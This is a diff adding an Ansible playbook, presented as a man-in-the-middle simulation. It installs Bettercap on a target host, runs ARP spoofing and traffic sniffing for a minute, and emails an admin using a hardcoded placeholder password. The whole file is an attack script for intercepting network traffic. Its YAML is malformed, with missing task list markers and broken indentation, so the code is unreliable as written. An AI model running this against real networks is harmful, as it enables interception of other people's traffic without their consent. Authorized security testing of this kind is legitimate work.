@@ -1,0 +1,27 @@
+---
+name: Simulate MITM attack
+hosts: target_machine
+become: yes
+tasks:
+name: Install MITM tool (Bettercap)
+  apt:
+    name: bettercap
+    state: present
+    update_cache: yes
+
+    
+name: Run Bettercap to spoof ARP (MITM simulation)
+    shell: >
+      bettercap -eval "net.probe on; arp.spoof on; net.sniff on" &
+      sleep 60
+
+    
+name: Notify admin of MITM simulation
+    mail:
+      host: smtp.example.com
+      port: 587
+      username: admin@example.com
+      password: "password"
+      to: admin@example.com
+      subject: "MITM Attack Simulation Triggered"
+      body: "The MITM attack simulation has been executed on the target network."
